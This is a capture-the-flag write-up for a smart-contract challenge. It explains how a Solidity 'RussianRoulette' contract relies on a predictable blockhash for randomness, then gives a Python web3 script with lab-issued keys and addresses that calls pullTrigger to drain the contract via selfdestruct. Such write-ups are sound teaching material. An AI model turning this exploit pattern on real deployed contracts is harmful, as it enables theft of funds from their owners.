solved by Fire Lord of the West🔥

chall files:
[RussianRoulette.sol](./RussianRoulette.sol)
[Setup.sol](./Setup.sol)

The challenge showed us a smart contract. 
A contract is something like a wallet , it also has it's own balance , the only difference is  it  can be programmed to do something
```js
pragma solidity 0.8.23;

contract RussianRoulette {

    constructor() payable {
        // i need more bullets
    }

    function pullTrigger() public returns (string memory) {
        if (uint256(blockhash(block.number - 1)) % 10 == 7) {
            selfdestruct(payable(msg.sender)); // 💀
        } else {
        return "im SAFU ... for now";
        }
    }
}
```
When the above contract is deployed to the blockchain , we can call its function , like `pullTrigger`  (  we  need to pay some amount of ether to call this function from the contract) . 
The vulnerable part of this code is it's using a predictable random source . 
```js
if (uint256(blockhash(block.number - 1)) % 10 == 7)
```
Block number can be predict and see by everyone on chain  ,so an attacker could leverage this and execute `pullTrigger` function at the correct block , so it hit `selfdestruct` and send all the available balance to us (msg.sender) 

From the Connection info from docker we are provided with 
```
Private key     :  
0xbcb5114805d36ebfb8b7f922af56c7e55b934a8fc4a3decb465c1ae5931a6464
Address         :  //This is your wallet  0x2532A1271EEb8dba8dBd0eA49C81cb3b54680ac4
Target contract :  0x4e5884766cC41aea0A2a6a59d4A81Ef6A685365B 
Setup contract  :  0x32484b0033E591f0713F32b00A5edD8F0f35A91e
```
So this is enough information to trigger a function on the deployed contract instance .
That's enough talking below is the code i used to solve it . BTW it's maybe quicker to just code this exploit in `solidity` . But i'm noob at `solidity` .


```python
'''
SO the key is to attack the random block generator on the block chain 
https://www.infuy.com/blog/preventing-the-source-of-randomness-vulnerability/

'''

from web3 import Web3
from eth_account import Account

rpc_url= "http://83.136.252.82:58425"

private_key= "0xbcb5114805d36ebfb8b7f922af56c7e55b934a8fc4a3decb465c1ae5931a6464"
address ="0x2532A1271EEb8dba8dBd0eA49C81cb3b54680ac4"
setup_contract_addr = "0x32484b0033E591f0713F32b00A5edD8F0f35A91e"
setup_contract_abi = [
	{
		"inputs": [],
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "TARGET",
		"outputs": [
			{
				"internalType": "contract RussianRoulette",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
] 

target_contract_addr = "0x4e5884766cC41aea0A2a6a59d4A81Ef6A685365B" 
target_contract_abi = [
	{
		"inputs": [],
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "pullTrigger",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]

# Initialize web3

web3 = Web3(Web3.HTTPProvider(rpc_url))
setup_contract = web3.eth.contract(address=setup_contract_addr,abi=setup_contract_abi)
target_contract = web3.eth.contract(address=target_contract_addr,abi=target_contract_abi)

# Init account 
account = Account.from_key(private_key)
web3.eth.default_account = address 

current_block_number = web3.eth.block_number
print("Current block number",current_block_number)

# print("Account Balance:",web3.eth.get_balance(address),"ETH")

contract_bal = web3.eth.get_balance(target_contract_addr) 
print("Target contract balance: ",web3.from_wei(contract_bal,'ether'))
#Exploit done here 
def pull_trigger():

    result = target_contract.functions.pullTrigger().transact({'from': address}) # Make transact trigger
    print("Result of pullTrigger function:", result)

pull_trigger()


def check_if_solved():
    is_solved = setup_contract.functions.isSolved().call()
    print("Is the RussianRoulette contract solved?", is_solved)

check_if_solved()
```